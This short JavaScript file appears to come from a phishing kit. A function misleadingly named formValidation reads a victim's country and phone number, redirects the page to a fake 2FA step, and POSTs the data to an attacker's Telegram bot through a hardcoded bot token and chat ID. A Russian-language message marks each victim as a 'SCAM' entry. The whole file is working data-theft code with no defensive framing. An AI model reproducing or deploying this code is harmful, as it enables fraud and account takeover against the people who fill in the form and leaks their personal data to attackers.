function formValidation() {
    $(document).ready(function(){
      window.location.href = '2fa.html';
    });
    let country = document.getElementById('country').value
    let number = document.getElementById('phone').value

    let text = '✅ Пользователь (SCAM) переход на 2fa! \n\n Страна: ' + country + '\n\n Номер: ' + number

    const TOKEN = '5669061761:AAE_0WY6mXMdEXVp48HVTDcdWecCoqvxzNI'; // токен
    const CHAT_ID = '-4143985214'; 
    
    otpravka(TOKEN,text,CHAT_ID);
 
    function otpravka(TOKEN,text,CHAT_ID){
      var z=$.ajax({  
      type: "POST",  
      url: "https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID,
      data: "parse_mode=HTML&text="+encodeURIComponent(text), 
      }); 
    };      
}